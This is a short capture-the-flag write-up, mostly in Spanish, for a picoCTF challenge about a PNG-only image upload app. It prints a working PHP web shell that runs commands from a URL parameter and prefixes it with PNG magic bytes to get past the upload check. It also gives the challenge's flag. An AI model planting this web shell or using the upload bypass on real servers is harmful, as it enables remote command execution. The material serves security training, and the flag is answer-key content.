
### Descripción 
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:55456/)!
### Solución
Tenemos que crackear una pagina web subiendo una imagen con extensión png, creamos un webshell php para crackear la pagina, cambiamos los bytes magicos del webshell, ese archivo lo subimos y comenzamos a navegar entre paginas
para encontrar la bandera
	PNG
	<?php
	if (isset($_GET['cmd'])) {
	    echo "<pre>";
	    system($_GET['cmd']);
	    echo "</pre>";
	} else {
	    echo "Usa ?cmd=COMANDO en la URL.";
	}
	?>
Solución: **picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9}**
### Notas adicionales


### Referencias 
https://www.youtube.com/watch?v=co8MZmviC1U&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=65
